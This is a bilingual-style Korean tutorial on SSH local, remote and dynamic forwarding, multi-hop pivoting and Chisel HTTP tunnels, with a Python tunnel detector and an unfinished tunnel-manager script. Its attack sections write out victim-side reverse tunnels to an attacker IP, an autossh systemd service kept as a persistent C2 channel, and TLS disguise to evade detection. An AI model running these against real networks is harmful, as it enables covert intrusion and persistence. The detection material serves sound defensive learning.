> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# SSH 터널링 & 포트 포워딩 — 공격과 방어

## 0. 초보자를 위한 개념 이해

### SSH 터널링이란?

SSH(Secure Shell)는 네트워크를 통해 다른 컴퓨터에 안전하게 접속하는 프로토콜이다. SSH 터널링은 이 암호화된 연결을 "파이프"로 활용하여, 다른 트래픽을 SSH 연결 안에 담아 전송하는 기법이다. 방화벽을 우회하거나 내부 서비스에 안전하게 접근하는 데 사용된다.

**왜 배우는가:**
```
SSH 터널링 활용 시나리오

[로컬 포트 포워딩]
  내 PC의 포트 → SSH 터널 → 원격 서버의 내부 서비스 접근
  예: localhost:3306 → DB서버(방화벽 안)의 MySQL

[원격 포트 포워딩]
  원격 서버의 포트 → SSH 터널 → 내 PC로 연결 유도
  예: 리버스 셸 유지, NAT 뒤 서버 노출

[동적 포트 포워딩(SOCKS)]
  내 PC가 프록시 서버처럼 동작
  예: 내부 네트워크 전체를 프록시로 접근 (피버팅)
```

### 핵심 개념 정리

```
SSH 포워딩 종류 비교

종류          명령어 옵션  방향           주요 용도
───────────────────────────────────────────────────
로컬 포워딩   -L          내→원격        내부 서비스 접근
원격 포워딩   -R          원격→내        리버스 터널, NAT 우회
동적 포워딩   -D          내→모든곳      SOCKS 프록시, 피버팅
```

### 필요한 도구 및 환경
- **openssh-client**: SSH 클라이언트 (`apt install openssh-client`)
- **proxychains**: SOCKS 프록시 체인 (`apt install proxychains4`)
- **chisel**: HTTP 기반 터널 (방화벽 우회 강화)

### 기초 실습 예제
```bash
# 1. 로컬 포트 포워딩 — 원격 MySQL에 로컬처럼 접근
# ssh -L [로컬포트]:[원격호스트]:[원격포트] [SSH서버]
ssh -L 3306:127.0.0.1:3306 user@ssh-server.com
# 이후 mysql -h 127.0.0.1 -P 3306 로 접속 가능

# 2. 동적 포트 포워딩 — SOCKS5 프록시
ssh -D 1080 user@ssh-server.com
# proxychains 설정 파일에 추가:
# echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
# proxychains nmap -sT TARGET_INTERNAL_HOST

# 3. 연결 유지 옵션
ssh -N -f -L 3306:127.0.0.1:3306 user@ssh-server.com
# -N: 원격 명령 실행 안 함 (터널만)
# -f: 백그라운드 실행
```

---

## 학습 목표

이 문서를 마치면 다음을 이해하고 실습할 수 있습니다.

- SSH가 무엇인지, 왜 보안에서 핵심 도구인지 설명할 수 있다
- 로컬 / 원격 / 동적 포워딩의 차이를 알고 올바른 상황에 적용할 수 있다
- 방화벽이 있는 환경에서 SSH 터널로 내부 서비스에 접근할 수 있다
- 피버팅(Pivoting)이 무엇인지 이해하고 다중 홉 터널을 구성할 수 있다
- Chisel로 HTTP 기반 터널을 만들 수 있다
- 블루팀 관점에서 SSH 터널링을 탐지하고 차단할 수 있다
- Python CLI 도구로 SSH 터널을 프로그래밍 방식으로 관리할 수 있다

---

## SSH 기초 — 완전 초보를 위한 설명

### SSH란 무엇인가?

SSH(Secure Shell)는 인터넷처럼 안전하지 않은 네트워크를 통해 다른 컴퓨터에 **안전하게 접속**하기 위한 프로토콜입니다. 1995년에 텔넷(Telnet)의 보안 취약점을 해결하기 위해 만들어졌습니다.

**핵심 비유: SSH 터널은 암호화된 파이프다**

```
일반 인터넷 통신:
  당신 ----[평문 데이터 노출]---→ 서버
      (누구나 중간에서 엿볼 수 있음)

SSH 통신:
  당신 ===[암호화된 터널]=====→ 서버
      (중간에서 엿봐도 알아볼 수 없음)
```

SSH를 실생활로 비유하면:
- **공개 인터넷 = 위험한 강**: 강을 건너면 누군가 당신의 짐(데이터)을 훔쳐볼 수 있습니다
- **SSH 터널 = 안전한 다리**: 강 위에 놓인 강화 유리 다리로, 밖에서는 안을 볼 수 없습니다
- **SSH 키 = 다리 열쇠**: 열쇠가 있는 사람만 다리를 이용할 수 있습니다

### SSH의 핵심 기능

| 기능 | 설명 | 예시 |
|------|------|------|
| 원격 로그인 | 다른 컴퓨터에 터미널로 접속 | 서버 관리 |
| 파일 전송 | SCP, SFTP로 안전한 파일 전송 | 배포 작업 |
| 포트 포워딩 | 다른 서비스의 트래픽을 터널로 전달 | **이 문서의 핵심** |
| 키 인증 | 비밀번호 없이 공개키/개인키로 인증 | 자동화 스크립트 |

```bash
# SSH 기본 사용법
ssh 사용자@서버주소          # 기본 접속 (포트 22)
ssh -p 2222 user@server    # 포트 지정
ssh -i ~/.ssh/id_rsa user@server  # 개인키 파일 지정

# SSH 키 생성
ssh-keygen -t ed25519 -C "my_key_comment"
# 공개키(id_ed25519.pub)를 서버의 ~/.ssh/authorized_keys에 복사
ssh-copy-id user@server
```

---

## 네트워크 포트란?

SSH 터널링을 이해하려면 먼저 "포트"가 무엇인지 알아야 합니다.

**비유: 컴퓨터는 호텔, 포트는 방 번호**

```
호텔(컴퓨터 IP: 192.168.1.10)
├── 22번 방  → SSH 서비스 (관리자 통로)
├── 80번 방  → HTTP 웹서비스 (일반 방문객)
├── 443번 방 → HTTPS 웹서비스 (보안 방문객)
├── 3306번 방 → MySQL 데이터베이스
└── 5432번 방 → PostgreSQL 데이터베이스
```

- **IP 주소**: 어느 건물(컴퓨터)인지 알려줌 (예: 192.168.1.10)
- **포트 번호**: 그 건물의 몇 호실인지 알려줌 (예: 3306)
- **서비스**: 그 방에서 운영 중인 서비스 (예: MySQL)

포트는 0~65535까지 있으며, 1024 이하는 "잘 알려진 포트(Well-Known Ports)"로 시스템 권한이 필요합니다.

---

## 방화벽이란?

**비유: 방화벽은 건물 보안 요원**

```
외부 인터넷
     |
  [방화벽] ← 보안 요원이 지키는 문
  /    \
허용  차단
 |      |
내부망  버려짐

방화벽 규칙 예시:
  "포트 80, 443만 통과 허용 — 나머지는 모두 차단"
  → HTTP/HTTPS만 통과, SSH(22)는 차단
```

방화벽은 허가된 통신만 통과시키고 나머지를 막는 네트워크 관문입니다. 기업 내부망은 보통:
- 웹(80, 443)은 허용
- SSH(22), RDP(3389) 등 관리 포트는 외부 차단
- 데이터베이스(3306, 5432) 등 내부 서비스는 완전 차단

**SSH 터널링이 방화벽을 우회하는 원리**:  
방화벽이 SSH(22번 포트)를 허용하면, SSH 연결 내부로 다른 서비스의 트래픽을 숨겨서 보낼 수 있습니다. 방화벽 입장에서는 "22번 포트로 SSH 통신"으로만 보이기 때문입니다.

---

## 1. SSH 포워딩 유형 — 개요

```
┌─────────────────────────────────────────────────────────────────┐
│                    SSH 포워딩 3가지 방식                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  로컬 포워딩 (-L):  나 → SSH → 원격 서비스                       │
│  원격 포워딩 (-R):  원격 → SSH → 나 (리버스 터널)                │
│  동적 포워딩 (-D):  모든 트래픽 → SOCKS 프록시 → SSH             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. 로컬 포트 포워딩 (-L)

### 개념 설명

로컬 포트 포워딩은 **"내 컴퓨터의 특정 포트를 원격 서비스에 연결하는"** 기법입니다.

**실생활 비유**: 회사 VPN이 없는데 내부 DB에 접근해야 할 때, SSH 서버를 경유해서 마치 내부에 있는 것처럼 접근하는 방식입니다.

### ASCII 다이어그램

```
[로컬 포워딩 시나리오]

상황: 공격자/관리자가 방화벽 밖에서 내부 DB에 접근하고 싶다

  공격자/관리자               점프 서버              내부 DB 서버
  (외부)                     (DMZ)                  (내부망)
  
  localhost:13306 ──────────► 10.0.0.1 ─────────────► 192.168.1.10:3306
  [로컬 포트]      SSH 터널   [점프서버]  내부 네트워크   [실제 DB]
  
  mysql -h 127.0.0.1 -P 13306    →    방화벽이 내부 DB 직접 접근 차단해도
                                      SSH를 통해 우회 가능
  
  명령어:
  ssh -L 13306:192.168.1.10:3306 user@10.0.0.1 -N -f
       │   └──────────────────┘ └───────────┘
       │   로컬포트:대상호스트:대상포트     SSH 서버
       └── 로컬 포워딩 플래그
```

### 실제 명령어와 사용 사례

```bash
# 기본 구조
ssh -L [로컬포트]:[대상호스트]:[대상포트] [SSH서버] -N -f

# ─────────────────────────────────────────────
# 사용 사례 1: 내부 MySQL DB 접근
# 시나리오: DB(192.168.1.10:3306)는 점프서버(10.0.0.1)를 통해서만 접근 가능
# ─────────────────────────────────────────────
ssh -L 13306:192.168.1.10:3306 user@10.0.0.1 -N -f
mysql -h 127.0.0.1 -P 13306 -u root -p

# ─────────────────────────────────────────────
# 사용 사례 2: 내부 웹 서비스 접근
# 시나리오: 내부 Jenkins(192.168.1.20:8080)에 외부에서 접근
# ─────────────────────────────────────────────
ssh -L 18080:192.168.1.20:8080 admin@bastion.corp.com -N -f
# 이후 브라우저에서 http://localhost:18080 접속

# ─────────────────────────────────────────────
# 사용 사례 3: 여러 포트 동시 포워딩
# ─────────────────────────────────────────────
ssh -L 13306:192.168.1.10:3306 \
    -L 18080:192.168.1.20:80 \
    -L 15432:192.168.1.30:5432 \
    -L 16379:192.168.1.40:6379 \
    user@10.0.0.1 -N -f

# ─────────────────────────────────────────────
# 공격 시나리오: 침투 테스트 중 내부 관리 포털 접근
# ─────────────────────────────────────────────
# 피해: 내부 관리 콘솔을 외부에서 접근하여 추가 취약점 탐색
ssh -L 8443:192.168.1.100:443 compromised_user@jump.corp.com -N
# → localhost:8443에서 내부 관리자 패널 접근

# 옵션 상세 설명
# -N : 원격 명령 실행하지 않고 포워딩만 수행 (보안상 권장)
# -f : 백그라운드로 실행 (foreground 없이)
# -C : 데이터 압축 (느린 연결에서 유용)
# -q : 조용히 실행 (경고 메시지 억제)
# -v : 상세 로그 출력 (디버깅용)
```

---

## 3. 원격 포트 포워딩 (-R) — 리버스 터널

### 개념 설명

원격 포트 포워딩은 **"방화벽 뒤의 내 서비스를 외부에서 접근 가능하게 만드는"** 기법입니다. 방향이 반대입니다: 피해자(내부)가 공격자(외부) 서버로 연결을 시작합니다.

**실생활 비유**: 공장(방화벽 뒤 내부망) 직원이 집에서 일하려고, 공장 컴퓨터에서 집 컴퓨터로 "역방향 전화"를 걸어 놓는 것. 방화벽은 나가는 연결(outbound)은 허용하기 때문에 가능합니다.

### ASCII 다이어그램

```
[원격 포워딩 시나리오 — 공격적 관점]

상황: 피해자 내부망에서 공격자 서버로 리버스 터널 연결

  피해자 내부망                                  공격자 서버
  (방화벽 뒤)                                    (인터넷)
  
  피해자 PC ─── SSH 연결 시작 ─────────────────► 공격자IP:22
  (192.168.1.50)     (아웃바운드 — 방화벽 허용)   │
                                                 │ 터널 완성
                                                 ▼
  공격자 도구 ◄──────────────────── 공격자IP:18080
  (curl, 브라우저)     포트 18080 → 터널 → 피해자:80
  
  피해자에서 실행하는 명령어:
  ssh -R 0.0.0.0:18080:127.0.0.1:80 attacker@공격자IP -N -f
  
  결과: 공격자가 curl http://공격자IP:18080 → 피해자 내부 웹서버 접근!

[정당한 사용 사례]
  
  원격 근무자 PC ─────────────────────────────► 회사 중계 서버
  (집, 방화벽 뒤)  SSH 리버스 터널             (인터넷 노출)
  
  동료 ◄──────────────────────────── 중계서버:8080
  (회사 동료가 원격 근무자 화면 접근)
```

### 실제 명령어와 사용 사례

```bash
# 기본 구조
ssh -R [원격포트]:[로컬호스트]:[로컬포트] [SSH서버] -N -f

# ─────────────────────────────────────────────
# 공격 시나리오 1: 내부 웹서버 외부 노출
# 피해자에서 실행
# ─────────────────────────────────────────────
ssh -R 0.0.0.0:18080:127.0.0.1:80 attacker@공격자IP -N -f

# 공격자 서버에서 확인
curl http://localhost:18080          # 로컬에서
curl http://공격자IP:18080           # 외부에서 (GatewayPorts 필요)

# ─────────────────────────────────────────────
# 공격 시나리오 2: 내부 SMB 서비스 노출 (자격증명 탈취용)
# ─────────────────────────────────────────────
ssh -R 14445:192.168.1.5:445 attacker@공격자IP -N -f
# → 공격자가 smbclient //공격자IP:14445/... 으로 직접 접근

# ─────────────────────────────────────────────
# 공격 시나리오 3: SSH 접근 채널 개설 (피해자 내부 SSH 노출)
# ─────────────────────────────────────────────
ssh -R 19922:127.0.0.1:22 attacker@공격자IP -N -f
# 이후 공격자는: ssh -p 19922 victim_user@공격자IP

# 공격자 서버 /etc/ssh/sshd_config 설정 필수
GatewayPorts yes  # 이 설정 없으면 localhost에서만 바인딩됨

# ─────────────────────────────────────────────
# 자동 재연결 리버스 터널 (안정적인 C2 채널)
# ─────────────────────────────────────────────
# autossh 설치
apt install autossh

# 피해자 시스템에서 실행 — 연결 끊겨도 자동 재연결
autossh -M 20000 -N \
  -R 0.0.0.0:19999:127.0.0.1:22 \
  attacker@공격자IP \
  -i /path/to/key \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o ExitOnForwardFailure=yes

# systemd 서비스로 등록 (부팅 시 자동 시작)
# /etc/systemd/system/ssh-tunnel.service
[Unit]
Description=SSH Reverse Tunnel
After=network.target

[Service]
ExecStart=/usr/bin/autossh -M 20000 -N \
  -R 0.0.0.0:19999:127.0.0.1:22 \
  attacker@공격자IP \
  -i /home/user/.ssh/tunnel_key \
  -o ServerAliveInterval=30
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

---

## 4. 동적 포워딩 (-D) — SOCKS 프록시

### 개념 설명

동적 포워딩은 **"SSH 서버를 프록시 서버로 만들어 모든 트래픽을 터널링하는"** 기법입니다. 특정 포트 하나가 아니라 모든 서비스에 접근할 수 있습니다.

**실생활 비유**: VPN과 비슷합니다. SSH 서버가 있는 네트워크 안에 있는 것처럼 행동할 수 있습니다. 모든 인터넷 요청이 SSH 서버를 통해 나갑니다.

**SOCKS5 프록시란?**: SOCKS(SOCKet Secure)는 네트워크 프록시 프로토콜입니다. 애플리케이션이 직접 인터넷에 연결하는 대신, SOCKS 프록시 서버를 통해 연결합니다. SSH `-D` 옵션이 SOCKS5 프록시 서버 역할을 합니다.

### ASCII 다이어그램

```
[동적 포워딩 — SOCKS 프록시]

  공격자 도구들         SOCKS5 프록시        SSH 터널         내부 네트워크
  
  nmap ────────────────►                                   192.168.1.0/24
  curl ────────────────► localhost:1080 ═══════════════► 내부 어떤 호스트든
  browser ─────────────►     (SSH -D)    SSH 암호화       192.168.1.10:80
  sqlmap ──────────────►                 터널             192.168.1.20:22
                                                         192.168.1.30:3306
  
  ssh -D 1080 user@점프서버IP -N -f
  
  proxychains 설정 후:
  proxychains nmap -sT 192.168.1.0/24    ← 내부망 전체 스캔!
  proxychains curl http://192.168.1.10   ← 내부 서버 접근!
```

### 실제 명령어와 사용 사례

```bash
# SOCKS5 프록시 생성 (로컬 1080 포트)
ssh -D 1080 user@점프서버IP -N -f

# ─────────────────────────────────────────────
# proxychains 설정
# ─────────────────────────────────────────────
# /etc/proxychains4.conf 수정
cat >> /etc/proxychains4.conf << 'EOF'
[ProxyList]
socks5  127.0.0.1 1080
EOF

# ─────────────────────────────────────────────
# proxychains를 통한 도구 사용
# ─────────────────────────────────────────────

# 내부망 전체 포트 스캔
proxychains nmap -sT -Pn -p 22,80,443,3306,5432,8080,8443 192.168.1.0/24

# 내부 웹 서비스 접근
proxychains curl http://192.168.1.100
proxychains curl -k https://192.168.1.100:8443

# 내부 서비스 공격 도구 실행
proxychains python3 exploit.py --target 192.168.1.10
proxychains sqlmap -u "http://192.168.1.20/page?id=1"

# Metasploit 세션도 프록시를 통해
proxychains msfconsole

# ─────────────────────────────────────────────
# 브라우저 프록시 설정
# ─────────────────────────────────────────────
# Firefox:
#   Settings → Network Settings → Manual proxy configuration
#   SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5
#   체크: Proxy DNS when using SOCKS v5

# Chrome (커맨드라인):
google-chrome --proxy-server="socks5://127.0.0.1:1080"

# ─────────────────────────────────────────────
# 포트 확인 — 프록시 활성 상태 확인
# ─────────────────────────────────────────────
ss -tlnp | grep 1080
netstat -tlnp | grep 1080
```

---

## 5. 다중 홉 터널링 (Pivoting)

### 피버팅(Pivoting)이란?

피버팅은 침투 테스트에서 **"이미 침투한 시스템을 발판(pivot) 삼아 더 깊은 내부망으로 이동하는"** 기법입니다.

**실생활 비유**: 
- 당신은 건물 1층(DMZ)에 접근했습니다
- 1층 직원의 ID 카드를 이용해 2층(내부망)으로 이동합니다
- 2층에서 3층(핵심 인프라)으로 다시 이동합니다

각 단계에서 이전에 침투한 시스템이 "발판(pivot point)"이 됩니다.

### ASCII 공격 체인 다이어그램

```
[다중 홉 피버팅 시나리오]

  인터넷            DMZ              내부망 A          핵심 내부망
  
  공격자 ──SSH──► 점프서버 ──SSH──► 서버A ──SSH──► DB 서버
  (외부)         (10.0.0.1)       (172.16.0.1)    (192.168.1.10)
                 [발판 1]          [발판 2]        [최종 목표]
  
  방화벽 1: 인터넷→DMZ (SSH 허용)
  방화벽 2: DMZ→내부망A (제한적)
  방화벽 3: 내부망A→핵심 (더 제한적)
  
  피버팅 없이는 공격자가 DB 서버에 직접 접근 불가!
  피버팅으로 각 방화벽을 단계적으로 우회.
```

### 구현 방법

```bash
# ─────────────────────────────────────────────
# 방법 1: 중첩 SSH 터널
# 공격자 → 서버A(10.0.0.1) → 서버B(172.16.0.1) → DB(192.168.1.10:3306)
# ─────────────────────────────────────────────

# 1단계: 서버A에서 서버B를 통해 DB로 터널 만들기 (서버A에서 실행)
ssh -L 0.0.0.0:23306:192.168.1.10:3306 user@172.16.0.1 -N -f

# 2단계: 공격자에서 서버A를 경유해 DB 접근 (공격자에서 실행)
ssh -L 13306:10.0.0.1:23306 user@10.0.0.1 -N -f

# 3단계: 공격자가 로컬에서 DB 접근
mysql -h 127.0.0.1 -P 13306 -u root -p
# 실제 연결 경로: localhost:13306 → 10.0.0.1:23306 → 192.168.1.10:3306

# ─────────────────────────────────────────────
# 방법 2: ProxyJump (-J) — 단일 명령으로 다중 홉
# ─────────────────────────────────────────────
# 직접 연결: 공격자 → 10.0.0.1 → 172.16.0.1 → 192.168.1.10
ssh -J user@10.0.0.1,user@172.16.0.1 user@192.168.1.10

# 포트 포워딩과 조합
ssh -J user@10.0.0.1,user@172.16.0.1 \
    -L 13306:192.168.1.10:3306 \
    user@192.168.1.10 -N -f

# ─────────────────────────────────────────────
# 방법 3: ~/.ssh/config 설정 (재사용 편리)
# ─────────────────────────────────────────────
cat >> ~/.ssh/config << 'EOF'
Host bastion
  HostName 10.0.0.1
  User user
  IdentityFile ~/.ssh/id_rsa

Host internal_a
  HostName 172.16.0.1
  User user
  ProxyJump bastion
  IdentityFile ~/.ssh/id_rsa

Host deep_internal
  HostName 192.168.1.10
  User user
  ProxyJump internal_a
  IdentityFile ~/.ssh/id_rsa
EOF

# 설정 후 단순하게 접근
ssh deep_internal
scp important_file.txt deep_internal:/tmp/

# ─────────────────────────────────────────────
# 방법 4: 동적 포워딩으로 피버팅 전체 서브넷 접근
# ─────────────────────────────────────────────
# 서버A를 통해 172.16.0.0/24 전체에 SOCKS 접근
ssh -J user@10.0.0.1 -D 1081 user@172.16.0.1 -N -f

# proxychains로 내부망 스캔
proxychains nmap -sT -Pn 192.168.1.0/24
```

---

## 6. Chisel — 방화벽 우회 HTTP 터널링

### Chisel이란?

Chisel은 **HTTP/HTTPS 위에서 동작하는 TCP 터널 도구**입니다. SSH 포트(22)가 막혀 있어도 웹 포트(80, 443)만 열려 있으면 사용할 수 있습니다.

**언제 사용하나?**:
- 방화벽이 SSH(22)를 완전히 차단
- 웹 트래픽(HTTP/HTTPS)만 허용
- SSH처럼 보이는 트래픽을 IDS/IPS가 차단

### 사용 시나리오와 예시

```bash
# 설치
go install github.com/jpillora/chisel@latest
# 또는 바이너리 직접 다운로드
curl -L https://github.com/jpillora/chisel/releases/download/v1.11.7/chisel_1.11.7_linux_amd64.gz | gunzip > chisel
chmod +x chisel

# ─────────────────────────────────────────────
# 시나리오 1: 리버스 SOCKS 터널 (가장 일반적)
# 방화벽이 SSH를 막고 HTTP만 허용
# ─────────────────────────────────────────────

# 공격자 서버 (포트 8080에서 서버 시작)
./chisel server --port 8080 --reverse --auth user:password

# 피해자 클라이언트 (내부망에서 실행)
./chisel client --auth user:password 공격자IP:8080 R:1080:socks

# 이후 공격자 측에서:
# /etc/proxychains4.conf에 socks5 127.0.0.1 1080 추가
proxychains nmap -sT 192.168.1.0/24

# ─────────────────────────────────────────────
# 시나리오 2: 특정 포트 리버스 포워딩
# ─────────────────────────────────────────────

# 공격자 서버
./chisel server --port 8080 --reverse

# 피해자 — 내부 DB를 공격자에게 노출
./chisel client 공격자IP:8080 R:13306:192.168.1.10:3306

# 공격자에서 DB 접근
mysql -h 127.0.0.1 -P 13306 -u root -p

# ─────────────────────────────────────────────
# 시나리오 3: 로컬 포워딩 (피해자에서 공격자 서버 접근)
# ─────────────────────────────────────────────

# 공격자 서버
./chisel server --port 8080

# 피해자 — 공격자의 서비스를 로컬에서 사용
./chisel client 공격자IP:8080 3306:공격자IP:3306  # 공격자 DB 접근

# ─────────────────────────────────────────────
# 시나리오 4: HTTPS로 위장 (트래픽 탐지 회피)
# ─────────────────────────────────────────────

# TLS 인증서 생성
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt -subj "/CN=legitimate.corp.com"

# 서버 (TLS 사용)
./chisel server --port 443 --reverse --tls-key server.key --tls-cert server.crt

# 클라이언트 (TLS 연결)
./chisel client --fingerprint SHA256_FINGERPRINT https://공격자IP:443 R:1080:socks
```

---

## 7. SSH 터널링 탐지 방법 — 블루팀 관점

### 탐지가 어려운 이유

SSH 터널링은 탐지가 어렵습니다:
1. 트래픽이 암호화되어 내용 검사 불가
2. 합법적인 SSH 연결과 겉모습이 동일
3. 방화벽 규칙을 이미 허용된 포트로 우회

### 탐지 방법들

```
[SSH 터널 탐지 체계]

1. 프로세스 분석
   └─ ps aux | grep ssh → -L/-R/-D 플래그 확인

2. 네트워크 연결 분석
   └─ netstat/ss → 비정상적인 포트 바인딩

3. 트래픽 패턴 분석
   └─ SSH 연결인데 트래픽량이 비정상적으로 많음

4. SSH 로그 분석
   └─ /var/log/auth.log → 비정상 SSH 연결

5. 시간 기반 분석
   └─ 장시간 지속되는 SSH 연결 (보통 터널은 오래 지속)
```

### 탐지 도구 — Python 스크립트

```python
#!/usr/bin/env python3
"""SSH 터널 탐지 및 모니터링 도구.

Usage:
    python3 ssh_tunnel_detector.py detect
    python3 ssh_tunnel_detector.py watch --interval 30
    python3 ssh_tunnel_detector.py network
"""

import subprocess
import re
import argparse
import time
import json
from dataclasses import dataclass, asdict
from pathlib import Path


@dataclass
class SshTunnel:
    pid: str
    user: str
    local_port: str
    remote_host: str
    remote_port: str
    direction: str          # local / remote / dynamic
    risk_level: str = "medium"
    raw_args: str = ""


@dataclass
class NetworkBind:
    pid: str
    program: str
    local_address: str
    local_port: str
    protocol: str


def detect_ssh_tunnels() -> list[SshTunnel]:
    """프로세스 목록에서 SSH 터널 탐지."""
    tunnels: list[SshTunnel] = []

    try:
        result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True,
            check=False,
        )
        for line in result.stdout.splitlines():
            if "ssh" not in line.lower():
                continue

            pid_match = re.search(r"^\S+\s+(\d+)", line)
            user_match = re.search(r"^(\S+)", line)
            pid = pid_match.group(1) if pid_match else "?"
            user = user_match.group(1) if user_match else "?"

            # 로컬 포워딩 -L
            for m in re.finditer(r"-L\s*(\d+):([^:\s]+):(\d+)", line):
                risk = "high" if m.group(2) not in ("127.0.0.1", "localhost") else "medium"
                tunnels.append(SshTunnel(
                    pid=pid,
                    user=user,
                    local_port=m.group(1),
                    remote_host=m.group(2),
                    remote_port=m.group(3),
                    direction="local",
                    risk_level=risk,
                    raw_args=line.strip()[:120],
                ))

            # 원격 포워딩 -R
            for m in re.finditer(r"-R\s*(?:[\d.]*:)?(\d+):([^:\s]+):(\d+)", line):
                tunnels.append(SshTunnel(
                    pid=pid,
                    user=user,
                    local_port=m.group(1),
                    remote_host=m.group(2),
                    remote_port=m.group(3),
                    direction="remote",
                    risk_level="high",   # 리버스 터널은 항상 고위험
                    raw_args=line.strip()[:120],
                ))

            # 동적 포워딩 -D (SOCKS)
            for m in re.finditer(r"-D\s*(\d+)", line):
                tunnels.append(SshTunnel(
                    pid=pid,
                    user=user,
                    local_port=m.group(1),
                    remote_host="SOCKS5_PROXY",
                    remote_port="*",
                    direction="dynamic",
                    risk_level="high",
                    raw_args=line.strip()[:120],
                ))

    except Exception as e:
        print(f"[!] 오류: {e}")

    return tunnels


def detect_unusual_binds() -> list[NetworkBind]:
    """비정상적인 포트 바인딩 탐지 (SSH 터널이 열어놓는 포트)."""
    binds: list[NetworkBind] = []

    try:
        result = subprocess.run(
            ["ss", "-tlnp"],
            capture_output=True,
            text=True,
            check=False,
        )
        for line in result.stdout.splitlines():
            # sshd가 아닌 프로세스가 22 이외 포트에서 들어오는 연결을 듣고 있으면 의심
            if "ssh" in line.lower() and "sshd" not in line.lower():
                m = re.search(
                    r"(\d+\.\d+\.\d+\.\d+|\*|::):(\d+).*pid=(\d+),fd=",
                    line,
                )
                if m:
                    binds.append(NetworkBind(
                        pid=m.group(3),
                        program="ssh (tunnel)",
                        local_address=m.group(1),
                        local_port=m.group(2),
                        protocol="tcp",
                    ))
    except Exception as e:
        print(f"[!] 네트워크 분석 오류: {e}")

    return binds


def format_tunnel_report(tunnels: list[SshTunnel]) -> str:
    """탐지 결과 포매팅."""
    if not tunnels:
        return "[*] 활성 SSH 터널 없음\n"

    lines: list[str] = [f"[!] SSH 터널 {len(tunnels)}개 감지:\n"]
    direction_labels = {
        "local": "→ 로컬 포워딩",
        "remote": "← 리버스 터널 [위험]",
        "dynamic": "⟳ SOCKS 프록시 [위험]",
    }
    risk_icons = {"high": "🔴", "medium": "🟡", "low": "🟢"}

    for t in tunnels:
        label = direction_labels.get(t.direction, t.direction)
        icon = risk_icons.get(t.risk_level, "")
        lines.append(f"  {icon} [{label}] PID={t.pid} USER={t.user}")
        if t.direction == "dynamic":
            lines.append(f"    SOCKS5 프록시 포트: {t.local_port}")
        else:
            lines.append(f"    포트 {t.local_port} ↔ {t.remote_host}:{t.remote_port}")
        lines.append("")

    return "\n".join(lines)


def watch_mode(interval: int) -> None:
    """주기적 모니터링 모드."""
    seen_pids: set[str] = set()
    print(f"[*] SSH 터널 모니터링 시작 (간격: {interval}초) — Ctrl+C로 중지\n")

    try:
        while True:
            tunnels = detect_ssh_tunnels()
            current_pids = {t.pid for t in tunnels}

            new_tunnels = [t for t in tunnels if t.pid not in seen_pids]
            if new_tunnels:
                print(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] 새로운 터널 감지!")
                print(format_tunnel_report(new_tunnels))

            gone_pids = seen_pids - current_pids
            for pid in gone_pids:
                print(f"[{time.strftime('%H:%M:%S')}] PID {pid} 터널 종료")

            seen_pids = current_pids
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[*] 모니터링 종료")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSH 터널 탐지 및 모니터링 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python3 ssh_tunnel_detector.py detect           # 현재 SSH 터널 탐지
  python3 ssh_tunnel_detector.py detect --json    # JSON 형식 출력
  python3 ssh_tunnel_detector.py watch            # 실시간 모니터링
  python3 ssh_tunnel_detector.py watch --interval 60  # 60초마다 확인
  python3 ssh_tunnel_detector.py network          # 비정상 포트 바인딩 탐지
        """,
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    detect_p = sub.add_parser("detect", help="현재 SSH 터널 탐지")
    detect_p.add_argument("--json", action="store_true", help="JSON 형식으로 출력")
    detect_p.add_argument("-o", "--output", type=Path, help="결과 저장 파일")

    watch_p = sub.add_parser("watch", help="실시간 모니터링")
    watch_p.add_argument("--interval", type=int, default=30, help="모니터링 간격(초)")

    sub.add_parser("network", help="비정상 포트 바인딩 탐지")

    args = parser.parse_args()

    if args.cmd == "detect":
        tunnels = detect_ssh_tunnels()
        if args.json:
            data = json.dumps([asdict(t) for t in tunnels], indent=2, ensure_ascii=False)
            print(data)
            if args.output:
                args.output.write_text(data)
        else:
            report = format_tunnel_report(tunnels)
            print(report)
            if args.output:
                args.output.write_text(report)

    elif args.cmd == "watch":
        watch_mode(args.interval)

    elif args.cmd == "network":
        binds = detect_unusual_binds()
        if not binds:
            print("[*] 비정상 포트 바인딩 없음")
        else:
            print(f"[!] 의심스러운 포트 바인딩 {len(binds)}개:")
            for b in binds:
                print(f"  PID={b.pid} | {b.local_address}:{b.local_port} | {b.program}")


if __name__ == "__main__":
    main()
```

---

## 8. SSH 터널 관리 CLI — Python 도구

```python
#!/usr/bin/env python3
"""SSH 터널 관리 CLI — 터널 생성, 모니터링, 종료.

Usage:
    python3 ssh_tunnel_manager.py local -l 13306 -r 192.168.1.10:3306 -s user@jump.server
    python3 ssh_tunnel_manager.py remote -r 18080 -l 127.0.0.1:80 -s user@attacker.com
    python3 ssh_tunnel_manager.py socks -p 1080 -s user@pivot.server
    python3 ssh_tunnel_manager.py list
    python3 ssh_tunnel_manager.py kill --pid 12345
    python3 ssh_tunnel_manager.py kill --all
"""

import argparse
import subprocess
import json
import signal
import sys
from dataclasses import dataclass, asdict, field
from pathlib import Path
from typing import Optional


STATE_FILE = Path("/tmp/.ssh_tunnels.json")


@dataclass
class TunnelConfig:
    tunnel_type: str       # local / remote / dynamic
    local_port: int
    remote_spec: str       # host:port 또는 빈 문자열 (dynamic)
    ssh_server: str
    ssh_key: Optional[str] = None
    extra_opts: list[str] = field(default_factory=list)
    pid: Optional[int] = None
    label: str = ""


def build_ssh_command(config: TunnelConfig) -> list[str]:
    """TunnelConfig로 SSH 명령어 구성."""
    cmd = ["ssh", "-N", "-f"]

    if config.ssh_key:
        cmd.extend(["-i", config.ssh_key])

    cmd.extend([
        "-o", "ServerAliveInterval=30",
        "-o", "ServerAliveCountMax=3",
